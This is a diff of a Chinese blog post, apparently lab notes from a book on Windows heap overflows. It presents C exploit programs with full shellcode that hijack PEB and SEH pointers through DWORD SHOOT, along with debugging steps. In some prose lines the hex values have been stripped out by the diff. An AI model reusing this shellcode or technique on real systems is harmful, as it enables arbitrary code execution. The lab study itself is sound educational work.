class="string">"\x88\x06\x52\x00\x20\xf0\xfd\x7f"</span>;</span><br><span class="line"><span class="comment">//0x00520688 is the address of shellcode in first heap block, you have to make sure this address via debug </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line">	<span class="comment">//__asm int 3 //used to break the process</span></span><br><span class="line">	<span class="comment">//memcpy(h1,shellcode,200); //normal cpy, used to watch the heap</span></span><br><span class="line">	<span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow,0x200=512</span></span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>编译环境如下：</p>
 <ul>
 <li>操作系统：运行于Vmware虚拟机，版本Win 2K SP4 5.00.2195 EN</li>
@@ -363,57 +361,55 @@
 </ul>
 <p>代码中第3个为最终版本的shellcode，这个shellcode效果是执行MessageBoxA()弹出一个对话框，但据0day书中解释，shellcode中调用的函数也需要使用临界区，因此在其执行过程中也需要调用P.E.B中0x20偏移处的指针指向的RtlEnterCriticalSection()函数，但该处的函数指针在shellcode执行时已经被我们掉包，因此会导致shellcode中的函数执行不成功。为了避免这个问题，需要在shellcode调用关键函数前修复该处的值，shellcode中77-79行的代码就是进行修复工作的。</p>
 <p>首先，去掉代码104行处的注释，通过INT 3中断进入OllyDBG进行调试。</p>
-<p>由于RtlEnterCriticalSection()函数的实际地址在不同操作系统上有所差异，因此此处需要手动确定，由于P.E.B的地址是固定的，为0x7FFDF000，因此在内存查看窗口中通过Ctrl+G并键入0x7FFDF020来到其偏移0x20处观察，得到在我的系统中RtlEnterCriticalSection()函数的地址为0x77F82060，因此将shellcode中78行处的修复代码中的该函数地址进行修改，本行整体改为”\xBB\x60\x20\xF8\x77”，其中\xBB为MOV EBX的机器码。</p>
-<p>接着，观察shellcode中第92行，0day书中尾块的地址为0x00520688，而我的机器上为0x00360688，因此将其中的\x52修改为\x36即可。</p>
+<p>由于RtlEnterCriticalSection()函数的实际地址在不同操作系统上有所差异，因此此处需要手动确定，由于P.E.B的地址是固定的，为0x7FFDF000，因此在内存查看窗口中通过Ctrl+G并键入0x7FFDF020来到其偏移0x20处观察，得到在我的系统中RtlEnterCriticalSection()函数的地址为0x77F82060，因此将shellcode中78行处的修复代码中的该函数地址进行修改，本行整体改为""，其中EBX的机器码。</p>
+<p>接着，观察shellcode中第92行，0day书中尾块的地址为0x00520688，而我的机器上为0x00360688，因此将其中的52修改为36即可。</p>
 <p>最后，再将第104行的INT 3中断注释掉，重新编译运行程序，即可成功弹窗。这里有个问题，如果不注释掉该行代码，INT 3中断后进入OllyDBG进行调试，最终程序会终止在ntdll的内核代码中，不会成功弹窗，也不会执行到我们的shellcode，我尝试了很多修改选项或者不同断点的方式都无法解决这个问题，由于它不影响我们对利用P.E.B进行堆溢出利用的理解，因此放在后面讨论。</p>
-<h5 id="3-关于其中细节的思考"><a href="#3-关于其中细节的思考" class="headerlink" title="3) 关于其中细节的思考"></a>3) 关于其中细节的思考</h5><p>虽然无法跟踪调试堆溢出的过程，但是我们可以观察一下堆溢出之前的堆内存的分布，当代码执行到106行memcpy()调用之前时，观察空表索引区，如下图：</p>
-<img data-src="/tech/heap-overflow-learning-notes-2/2_2_1_1.png" class="" title="图2.2.1.1">
-
+<h5 id="关于其中细节的思考">3) 关于其中细节的思考</h5>
+<p>虽然无法跟踪调试堆溢出的过程，但是我们可以观察一下堆溢出之前的堆内存的分布，当代码执行到106行memcpy()调用之前时，观察空表索引区，如下图：</p>
+<img src="/tech/heap-overflow-learning-notes-2/2_2_1_1.png" class="" title="图2.2.1.1">
 <p>观察堆数据区：</p>
-<img data-src="/tech/heap-overflow-learning-notes-2/2_2_1_2.png" class="" title="图2.2.1.2">
-
+<img src="/tech/heap-overflow-learning-notes-2/2_2_1_2.png" class="" title="图2.2.1.2">
 <p>可以看到尾块的前后向指针均指向0x178处的Freelist[0]。</p>
 <p>接着执行代码到完成106行的memcpy操作，再观察对数据区：</p>
-<img data-src="/tech/heap-overflow-learning-notes-2/2_2_1_3.png" class="" title="图2.2.1.3">
-
+<img src="/tech/heap-overflow-learning-notes-2/2_2_1_3.png" class="" title="图2.2.1.3">
 <p>由于h1处发生溢出，0x688处写入的shellcode会越界覆盖到0x758处的尾块的前后向指针，前向指针flink被修改为0x00360688，后向指针blink被修改为0x7FFDF020。由于当前尾块与Freelist[0]相互串接，而h2会申请(1+1) x 8 Byte的空间，当前Freelist[2]中没有空闲块，因此会从尾块中”分割“所需空间给h2，这需要将当前尾块从Freelist[0]中”卸下“，而前面的堆溢出利用原理中介绍过，将一个结点从双向链表中“卸下”的函数很可能是类似这样的：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	node -&gt; <span class="built_in">blink</span> -&gt; flink = node -&gt; flink;</span><br><span class="line">	node -&gt; flink -&gt; <span class="built_in">blink</span> = node -&gt; <span class="built_in">blink</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>其中，node可理解即为该节点数据区（而非块首）的地址，本例中可如下理解：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD ** node = <span class="number">0x00360758</span>; <span class="comment">//node指向尾块数据区</span></span><br><span class="line"></span><br><span class="line">node值为<span class="number">0x00360758</span>。</span><br><span class="line">*node值为<span class="number">0x00360688</span>，是被覆盖后的前向指针flink。</span><br><span class="line">*(node+<span class="number">4</span>)值为<span class="number">0x7FFDF020</span>，是被覆盖后的后向指针<span class="built_in">blink</span>。</span><br></pre></td></tr></table></figure>
-
 <p>则如下操作就可以这样理解:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -&gt; flink 等价于 *(node+<span class="number">0</span>)，即*node</span><br><span class="line">node -&gt; <span class="built_in">blink</span> 等价于 *(node+<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
-
 <p>因此，上面的代码可以理解为</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	*(*(node+<span class="number">4</span>)) = *node;</span><br><span class="line">	*(*node+<span class="number">4</span>) = *(node+<span class="number">4</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>因此本例可最终理解为进行了如下操作</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Memory(<span class="number">0x7FFDF020</span>) = <span class="number">0x00360688</span>; <span class="comment">//P.E.B DWORD SHOOT</span></span><br><span class="line">Memory(<span class="number">0x0036068C</span>) = <span class="number">0x7FFDF020</span>; <span class="comment">//指针反射</span></span><br></pre></td></tr></table></figure>
-
 <p>如上代码中第一行向内存地址0x7FFDF020写入了DWORD值0x00360688，篡改了该处原来存储的指向临界区函数RtlEnterCriticalSection()的指针，因此在程序出错退出调用ExitProcess()时，就会需要到P.E.B便宜0x20处获得指向RtlEnterCriticalSection()函数的指针，结果获得的是shellcode的地址0x00360688，因此转而去执行shellcode。</p>
-<p>但观察第二行代码，代码会向shellcode前部第5 Byte处写入DWORD 值0x7FFDF020，因此位于shellcode中的\x20\xF0\xFD\x7F会被当做机器码执行，这有可能影响shellcode的正确执行，这种现象叫做_<strong>指针反射</strong>_，好在本例中这些指令无关痛痒“，并没有影响shellcode关键代码的执行。</p>
+<p>但观察第二行代码，代码会向shellcode前部第5 Byte处写入DWORD 值0x7FFDF020，因此位于shellcode中的7F会被当做机器码执行，这有可能影响shellcode的正确执行，这种现象叫做_<strong>指针反射</strong>_，好在本例中这些指令无关痛痒“，并没有影响shellcode关键代码的执行。</p>
 <blockquote><p>但如果在为某个特定漏洞开发exploit时，指针反射发生且目标指针不能当做”无关痛痒“的指令安全地执行过去，那就得开动脑筋使用别的目标，或者使用跳板技术。这也是我介绍了很多种利用思路给大家的原因——要不然就只有自认倒霉了。</p>
 <footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P177</cite></footer></blockquote>
-
-
-<h4 id="2-通过S-E-H（异常处理结构体）实施攻击"><a href="#2-通过S-E-H（异常处理结构体）实施攻击" class="headerlink" title="(2) 通过S.E.H（异常处理结构体）实施攻击"></a>(2) 通过S.E.H（异常处理结构体）实施攻击</h4><h5 id="1-S-E-H利用原理"><a href="#1-S-E-H利用原理" class="headerlink" title="1) S.E.H利用原理"></a>1) S.E.H利用原理</h5><blockquote><p>操作系统或程序运行时，难免会遇到各种各样的错误，为了保证系统在遇到错误时不至于崩溃了，仍能够健壮稳定地继续运行下去，Windows会对运行在其中的程序提供一次补救的机会来处理错误，这种机制就是异常处理机制。</p>
+<h4 id="通过s.e.h异常处理结构体实施攻击">(2) 通过S.E.H（异常处理结构体）实施攻击</h4>
+<h5 id="s.e.h利用原理">1) S.E.H利用原理</h5>
+<blockquote><p>操作系统或程序运行时，难免会遇到各种各样的错误，为了保证系统在遇到错误时不至于崩溃了，仍能够健壮稳定地继续运行下去，Windows会对运行在其中的程序提供一次补救的机会来处理错误，这种机制就是异常处理机制。</p>
 <p>S.E.H即异常处理结构体（Structure Exception Handler），它是Windows异常处理机制所采用的重要数据结构。每个S.E.H包含两个DWORD指针：S.E.H链表指针和异常处理函数句柄，共8个字节，如图6.1.1所示。</p>
-<img data-src="/tech/heap-overflow-learning-notes-2/0day_6_1_1.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P178 -&gt; 图6.1.1">
-
+<p><img src="/tech/heap-overflow-learning-notes-2/0day_6_1_1.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P178 -&gt; 图6.1.1"></p>
 <p>作为对S.E.H的初步了解，我们现在只需要知道一下几个要点，S.E.H链表如图6.1.2所示。</p>
-<p>(1) S.E.H结构体存放在系统栈中。<br>(2) 当线程初始化时，会自动向栈中安装一个S.E.H，作为线程默认的一场处理。<br>(3) 如果程序源代码中使用了<strong>try{}</strong>except{}或者Assert宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个S.E.H来实现异常处理。<br>(4) 栈中一般会同时存在多个S.E.H<br>(5) 栈中的多个S.E.H通过链表指针在栈内由栈顶向栈底串成单向链表，位于链表最顶端的S.E.H通过T.E.B（线程环境块）0字节偏移处的指针标识。<br>(6) 当异常发生时，操作系统会中断程序，并首先从T.E.B的0字节偏移处取出距离栈顶最近的S.E.H，使用异常处理函数句柄所指向的代码来处理异常。<br>(7) 当离”事故现场“最近的异常处理函数运行失败时，将顺着S.E.H链表依次尝试其他的异常处理函数。<br>(8) 如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。</p>
+<ol type="1">
+<li>S.E.H结构体存放在系统栈中。</li>
+<li>当线程初始化时，会自动向栈中安装一个S.E.H，作为线程默认的一场处理。</li>
+<li>如果程序源代码中使用了__try{}__except{}或者Assert宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个S.E.H来实现异常处理。</li>
+<li>栈中一般会同时存在多个S.E.H</li>
+<li>栈中的多个S.E.H通过链表指针在栈内由栈顶向栈底串成单向链表，位于链表最顶端的S.E.H通过T.E.B（线程环境块）0字节偏移处的指针标识。</li>
+<li>当异常发生时，操作系统会中断程序，并首先从T.E.B的0字节偏移处取出距离栈顶最近的S.E.H，使用异常处理函数句柄所指向的代码来处理异常。</li>
+<li>当离”事故现场“最近的异常处理函数运行失败时，将顺着S.E.H链表依次尝试其他的异常处理函数。</li>
+<li>如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。</li>
+</ol>
 <footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P178-179</cite></footer></blockquote>
-
-<img data-src="/tech/heap-overflow-learning-notes-2/0day_6_1_2.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P179 -&gt; 图6.1.2">
-
-<blockquote><p>从程序设计角度来讲 ，S.E.H就是在系统关闭程序之前，给程序一个预先执行设定的回调函数（call back）的机会。大概明白了S.E.H的工作原理之后 ，聪明的读者朋友们可能已经发现了问题所在。<br>(1) S.E.H存放在栈中，故溢出缓冲区的数据有可能淹没S.E.H。<br>(2) 精心制造的溢出数据可以把S.E.H中异常处理函数的入口地址更改为shellcode的起始地址。<br>(3) 溢出后错误的栈帧或堆块数据往往会触发异常。<br>(4) 当Windows开始处理溢出后的异常时，会错误地把shellcode当作异常处理函数而执行。</p>
+<img src="/tech/heap-overflow-learning-notes-2/0day_6_1_2.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P179 -&gt; 图6.1.2">
+<blockquote><p>从程序设计角度来讲 ，S.E.H就是在系统关闭程序之前，给程序一个预先执行设定的回调函数（call back）的机会。大概明白了S.E.H的工作原理之后 ，聪明的读者朋友们可能已经发现了问题所在。 (1) S.E.H存放在栈中，故溢出缓冲区的数据有可能淹没S.E.H。 (2) 精心制造的溢出数据可以把S.E.H中异常处理函数的入口地址更改为shellcode的起始地址。 (3) 溢出后错误的栈帧或堆块数据往往会触发异常。 (4) 当Windows开始处理溢出后的异常时，会错误地把shellcode当作异常处理函数而执行。</p>
 <footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P178-179</cite></footer></blockquote>
-
-<h5 id="2-实验-1"><a href="#2-实验-1" class="headerlink" title="2) 实验"></a>2) 实验</h5><p>本实验通过淹没尾块块首，来触发DWORD SHOOT以修改S.E.H中第一个异常处理函数的地址，导致堆溢出产生错误需执行异常处理函数时实际却执行了shellcode。</p>
+<h5 id="实验-1">2) 实验</h5>
+<p>本实验通过淹没尾块块首，来触发DWORD SHOOT以修改S.E.H中第一个异常处理函数的地址，导致堆溢出产生错误需执行异常处理函数时实际却执行了shellcode。</p>
 <p>本实验代码与第五章中代码类似，因此作者没有在随书代码中给出，下面给出我自己修改的版本：</p>
 <figure class="highlight c"><figcaption><span>《0day安全：软件漏洞分析技术》(第二版) -> P184</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x16\x01\x1A\x00\x00\x10\x00\x00"</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">"\x88\x06\x36\x00"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">MyExceptionHandler</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">	HANDLE hp;</span><br><span class="line"></span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow, 0x200=512</span></span><br><span class="line">	</span><br><span class="line">	__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">	__try&#123;</span><br><span class="line">		h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	__except(MyExceptionHandler())&#123;&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>编译环境如下：</p>
 <ul>
 <li>操作系统：运行于Vmware虚拟机，版本Win 2K SP4 5.00.2195 EN</li>
@@ -423,26 +419,22 @@
 </ul>
 <p>可以观察到，本例中shellcode与上例中基本一致，不同之处有二：</p>
 <ul>
-<li>DWORD SHOOT的目标地址，即shellcode的最后4 Byte，本例中暂为\x90\x90\x90\x90，为异常处理函数地址，在进行一次调试确定后，再替换即可</li>
+<li>DWORD SHOOT的目标地址，即shellcode的最后4 Byte，本例中暂为，为异常处理函数地址，在进行一次调试确定后，再替换即可</li>
 <li>本例中没有进行上例中对0x7FFDF020处临界区函数RtlEnterCriticalSection()指针的修复，因为本例中并没有改变它。</li>
 </ul>
 <p>在编译后执行程序之前，先改变OllyDBG设置，不忽略任何异常，如下图:</p>
-<img data-src="/tech/heap-overflow-learning-notes-2/2_2_2_1.png" class="" title="图2.2.2.1">
-
+<img src="/tech/heap-overflow-learning-notes-2/2_2_2_1.png" class="" title="图2.2.2.1">
 <p>接着执行程序，在INT3处中断，观察此时栈中的S.E.H chain，View菜单 -&gt; SEH chain，如下图：</p>
-<img data-src="/tech/heap-overflow-learning-notes-2/2_2_2_2.png" class="" title="图2.2.2.2">
-
+<img src="/tech/heap-overflow-learning-notes-2/2_2_2_2.png" class="" title="图2.2.2.2">
 <p>但是，这时看到的SEH chain中并没有在我们的程序发生堆溢出异常时需要用到的第一个S.E.H。需要接着执行代码直到调用行的HeapAlloc()函数，这时会出现异常，指令窗口会从用户程序代码转入ntdll.dll中的内核代码，此时再观察S.E.H chain，如下图：</p>
-<img data-src="/tech/heap-overflow-learning-notes-2/2_2_2_3.png" class="" title="图2.2.2.3">
-
+<img src="/tech/heap-overflow-learning-notes-2/2_2_2_3.png" class="" title="图2.2.2.3">
 <p>观察上图，0x0012FF2C即为处理本程序第一个异常的S.E.H的地址，前面介绍过，S.E.H是个结构体，其中先后包含着下一个S.E.H的指针和异常处理函数指针，因此，我们DWORD SHOOT的目标地址为 (0x0012FF2C + 4) = 0x0012FF30。</p>
-<p>接着，修改C代码第18行shellcode中DWORD SHOOT的目标地址为\x30\xFF\x12\x00，注释掉第33行的INT3中断，重新编译执行，成功弹窗。</p>
+<p>接着，修改C代码第18行shellcode中DWORD SHOOT的目标地址为，注释掉第33行的INT3中断，重新编译执行，成功弹窗。</p>
 <p>可以看到，这次我们依然需要注释掉INT3，否则编译执行后进入OllyDBG调试后运行，程序是不会正常弹窗的，其原因在0day书中后文中有提到：</p>
 <blockquote><p>当异常发生时，系统会顺着S.E.H链表搜索能够处理异常的句柄；一旦找到了恰当的句柄，系统会将已经遍历过的S.E.H中的异常处理函数再调用一遍，这个过程就是所谓的unwind操作，第二轮地调用就是unwind调用。</p>
 <p>unwind操作通过kernel32.dll中的一个导出函数RtlUnwind实现，实际上kernel32.dll会转而再去调用ntdll.dll中的同名函数。</p>
 <p>最后，还要堆栈中的异常处理做最后一点补充：在使用回调函数之前，系统会判断当前是否处于调试状态，如果处于调试状态，将把异常交给调试器处理。</p>
 <footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P188-190</cite></footer></blockquote>
-
 <p>从上文的解释就可以明白为什么我们的代码会触发异常后会进入ntdll的代码执行，而且也能解释为什么保留INT3编译执行后不会弹窗了，因为在处理异常时系统检测到当前处于调试器中，因此把该异常交给调试器处理了，而OllyDBG跟系统处理异常的方式不同，它并没有调用系统的异常处理函数，因此我们的shellcode没有得到执行。</p>
 
     </div>
@@ -540,7 +532,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#堆溢出原理及利用"><span class="nav-number">1.</span> <span class="nav-text">堆溢出原理及利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-堆溢出原理"><span class="nav-number">1.1.</span> <span class="nav-text">1. 堆溢出原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-堆溢出利用"><span class="nav-number">1.2.</span> <span class="nav-text">2. 堆溢出利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-利用P-E-B（进程环境块）实施攻击"><span class="nav-number">1.2.1.</span> <span class="nav-text">(1) 利用P.E.B（进程环境块）实施攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-P-E-B利用原理"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">1) P.E.B利用原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-实验"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">2) 实验</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-关于其中细节的思考"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">3) 关于其中细节的思考</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-通过S-E-H（异常处理结构体）实施攻击"><span class="nav-number">1.2.2.</span> <span class="nav-text">(2) 通过S.E.H（异常处理结构体）实施攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-S-E-H利用原理"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">1) S.E.H利用原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-实验-1"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">2) 实验</span></a></li></ol></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#堆溢出原理及利用"><span class="nav-number">1.</span> <span class="nav-text">堆溢出原理及利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#堆溢出原理"><span class="nav-number">1.1.</span> <span class="nav-text">1. 堆溢出原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#堆溢出利用"><span class="nav-number">1.2.</span> <span class="nav-text">2. 堆溢出利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#利用p.e.b进程环境块实施攻击"><span class="nav-number">1.2.1.</span> <span class="nav-text">(1) 利用P.E.B（进程环境块）实施攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#p.e.b利用原理"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">1) P.E.B利用原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#实验"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">2) 实验</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#关于其中细节的思考"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">3) 关于其中细节的思考</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#通过s.e.h异常处理结构体实施攻击"><span class="nav-number">1.2.2.</span> <span class="nav-text">(2) 通过S.E.H（异常处理结构体）实施攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#s.e.h利用原理"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">1) S.E.H利用原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#实验-1"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">2) 实验</span></a></li></ol></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -556,7 +548,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -569,7 +561,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-count">36</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -624,14 +616,14 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="Word Count Total">118k</span>
+    <span title="Symbols count total">125k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading Time Total">1:47</span>
+    <span title="Reading time total">1:54</span>
 </div>
-  <div class="powered-by">Powered by <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly9tdXNlLnRoZW1lLW5leHQub3Jn">NexT.Muse</span>
+  <div class="powered-by">Powered by <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
   </div>
 
         
@@ -670,8 +662,6 @@
   
 
 
-
-
   
   <style>
   
@@ -687,13 +677,11 @@
   <script src="/lib/anime.min.js"></script>
   <script src="/lib/pjax/pjax.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
-  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/fancybox@3/dist/js/jquery.fancybox.pack.js"></script>
   <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
   <script src="/lib/velocity/velocity.min.js"></script>
   <script src="/lib/velocity/velocity.ui.min.js"></script>
   <script src="/lib/darkmode-js/lib/darkmode-js.min.js"></script>
-
 
 
 <script>
@@ -753,7 +741,7 @@ var pjax = new Pjax({
   scrollTo : !CONFIG.bookmark.enable
 });
 
